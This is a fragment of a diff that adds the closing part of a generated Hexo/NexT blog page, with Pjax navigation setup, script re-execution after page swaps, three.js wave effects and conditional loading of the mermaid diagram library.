+var pjax = new Pjax({
+  selectors: [
+    'head title',
+    '#page-configurations',
+    '.content-wrap',
+    '.post-toc-wrap',
+    '.languages',
+    '#pjax'
+  ],
+  switches: {
+    '.post-toc-wrap': Pjax.switches.innerHTML
+  },
+  analytics: false,
+  cacheBust: false,
+  scrollTo : !CONFIG.bookmark.enable
+});
+
+window.addEventListener('pjax:success', () => {
+  document.querySelectorAll('script[data-pjax], script#page-configurations, #pjax script').forEach(element => {
+    var code = element.text || element.textContent || element.innerHTML || '';
+    var parent = element.parentNode;
+    parent.removeChild(element);
+    var script = document.createElement('script');
+    if (element.id) {
+      script.id = element.id;
+    }
+    if (element.className) {
+      script.className = element.className;
+    }
+    if (element.type) {
+      script.type = element.type;
+    }
+    if (element.src) {
+      script.src = element.src;
+      // Force synchronous loading of peripheral JS.
+      script.async = false;
+    }
+    if (element.dataset.pjax !== undefined) {
+      script.dataset.pjax = '';
+    }
+    if (code !== '') {
+      script.appendChild(document.createTextNode(code));
+    }
+    parent.appendChild(script);
+  });
+  NexT.boot.refresh();
+  // Define Motion Sequence & Bootstrap Motion.
+  if (CONFIG.motion.enable) {
+    NexT.motion.integrator
+      .init()
+      .add(NexT.motion.middleWares.subMenu)
+      .add(NexT.motion.middleWares.postList)
+      .bootstrap();
+  }
+  NexT.utils.updateSidebarPosition();
+});
+</script>
+
+
+  <script defer src="/lib/three/three.min.js"></script>
+    <script defer src="/lib/three/three-waves.min.js"></script>
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+
+<script data-pjax>
+if (document.querySelectorAll('pre.mermaid').length) {
+  NexT.utils.getScript('//cdn.jsdelivr.net/npm/mermaid@8/dist/mermaid.min.js', () => {
+    mermaid.initialize({
+      theme    : 'dark',
+      logLevel : 3,
+      flowchart: { curve     : 'linear' },
+      gantt    : { axisFormat: '%m/%d/%Y' },
+      sequence : { actorMargin: 50 }
+    });
+  }, window.mermaid);
+}
+</script>
+
+
+    <div id="pjax">
+  
+
+  
+
+    </div>
+</body>
+</html>
